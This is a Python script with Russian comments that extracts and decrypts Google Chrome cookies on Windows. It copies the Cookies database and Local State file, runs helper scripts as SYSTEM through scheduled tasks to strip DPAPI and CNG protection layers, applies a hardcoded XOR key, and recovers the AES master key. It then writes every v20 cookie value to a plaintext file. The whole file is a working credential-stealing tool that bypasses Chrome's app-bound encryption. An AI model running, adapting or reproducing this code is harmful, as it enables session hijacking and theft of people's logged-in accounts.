# /// script
# requires-python = ">=3.10"
# dependencies = ["pywin32"]
# ///


import shutil, os
from pathlib import Path
import struct
import sqlite3
import win32crypt
import json
import base64
import subprocess
import time
from Crypto.Cipher import AES

# копируем файл куки и мастер ключа
def move_files():
    cookie_fpath = r"%LocalAppData%\Google\Chrome\User Data\Default\Network\Cookies"
    cookie_rpath = os.path.expandvars(cookie_fpath)

    masterkey_fpath = r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
    masterkey_rpath = os.path.expandvars(masterkey_fpath)

    shutil.copy(cookie_rpath, r"E:\chrome_cookie")
    shutil.copy(masterkey_rpath, r"E:\chrome_cookie")

# далее необходимо извлечь мастер-ключ
def decrypt_masterkey():
    with open(r"E:\chrome_cookie\Local State", "r") as f:
        data = f.read()
        parsed_data = json.loads(data)
        masterkey = parsed_data["os_crypt"]['app_bound_encrypted_key']
        decode_masterkey = base64.b64decode(masterkey)
        real_masterkey = decode_masterkey[4:]
        return real_masterkey

# снимаем SYSTEM слой с помощью запуска в SYSTEM контексте планируемой задачи
def system_layer_decrypt(hex_masterkey):
    script_dir = Path(__file__).parent
    (Path(r"E:\chrome_cookie") / "hexkey.txt").write_text(hex_masterkey)
    python_exe = r"C:\Users\0987a\AppData\Local\Programs\Python\Python313\python.exe"
    sysdecrypt = script_dir / "sysdecrypt.py"
    task_run = f'"{python_exe}" "{sysdecrypt}"'
    tr_arg = '"' + task_run.replace('"', '\\"') + '"'
    create_cmd = (
        'schtasks /Create /TN "MyPythonTask" '
        f'/TR {tr_arg} '
        '/SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F'
    )
    run_cmd = 'schtasks /Run /TN "MyPythonTask"'
    subprocess.run(create_cmd, check=True)
    subprocess.run(run_cmd, check=True)

def user_layer_decrypt():
    with open(r"E:\chrome_cookie\system_decrypted.hex", "r") as f:
        data = f.read()
        try:
            decrypted_blob = win32crypt.CryptUnprotectData(bytes.fromhex(data))[1]
            with open(r"E:\chrome_cookie\user_decrypted.hex", "w") as out:
                out.write(decrypted_blob.hex())
            return decrypted_blob
        except Exception as e:
            print(e)
    return None

def cng_layer_decrypt():
    script_dir = Path(__file__).parent
    python_exe = r"C:\Users\0987a\AppData\Local\Programs\Python\Python313\python.exe"
    cngdecrypt = script_dir / "cng_decrypt.py"
    task_run = f'"{python_exe}" "{cngdecrypt}"'
    tr_arg = '"' + task_run.replace('"', '\\"') + '"'
    create_cmd = (
        'schtasks /Create /TN "MyCNGTask" '
        f'/TR {tr_arg} '
        '/SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F'
    )
    subprocess.run(create_cmd, check=True)
    subprocess.run('schtasks /Run /TN "MyCNGTask"', check=True)

# шаг 2: XOR + AES-GCM -> получаем 32-байтовый мастер-ключ
def derive_master_key():
    staging = Path(r"E:\chrome_cookie")

    # фиксированный XOR-ключ для флага 4 (зашит в elevation_service.exe)
    xor_key = bytes.fromhex("208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158")

    # расшифрованный CNG-ключ ксорим с xor_key -> AES-ключ
    cnkey = bytes.fromhex((staging / "cnkey.hex").read_text().strip())
    aes_key = bytes(a ^ b for a, b in zip(cnkey, xor_key))

    # достаём из user_decrypted.hex iv / ciphertext / tag
    blob = bytes.fromhex((staging / "user_decrypted.hex").read_text().strip())
    header_len = struct.unpack("<I", blob[:4])[0]
    off = 4 + header_len + 4          # позиция флага
    iv = blob[off + 1 + 32: off + 1 + 32 + 12]
    ciphertext = blob[off + 1 + 32 + 12: off + 1 + 32 + 12 + 32]
    tag = blob[-16:]

    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
    master_key = cipher.decrypt_and_verify(ciphertext, tag)
    (staging / "master_key.hex").write_text(master_key.hex())
    return master_key

# шаг 3: расшифровываем значения v20 из базы Cookies мастер-ключом
def decrypt_cookies(master_key):
    staging = Path(r"E:\chrome_cookie")

    con = sqlite3.connect(str(staging / "Cookies"))
    cur = con.cursor()
    rows = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies").fetchall()
    con.close()

    lines = []
    count = 0
    for host, name, enc in rows:
        if not enc or not enc.startswith(b"v20"):
            continue
        try:
            # v20 + iv(12) + ciphertext + tag(16)
            iv = enc[3:15]
            ciphertext = enc[15:-16]
            tag = enc[-16:]
            plain = AES.new(master_key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(ciphertext, tag)
            value = plain[32:].decode("utf-8")   # первые 32 байта — служебный префикс
            lines.append(f"{host}\t{name}\t{value}")
            count += 1
        except Exception as e:
            lines.append(f"{host}\t{name}\tDECRYPT_ERROR: {e}")

    (staging / "cookies_decrypted.txt").write_text("\n".join(lines), encoding="utf-8")
    return count

        
if __name__ == "__main__":
    move_files()
    real_masterkey = decrypt_masterkey()
    hex_masterkey = real_masterkey.hex()
    system_layer_decrypt(hex_masterkey)
    time.sleep(5)
    print(user_layer_decrypt())
    cng_layer_decrypt()
    time.sleep(5)
    master_key = derive_master_key()
    print("master key:", master_key.hex())
    print("decrypted cookies:", decrypt_cookies(master_key))
#print(Path(__file__))
# далее необходимо получить DPAPI поле через SYSTEM


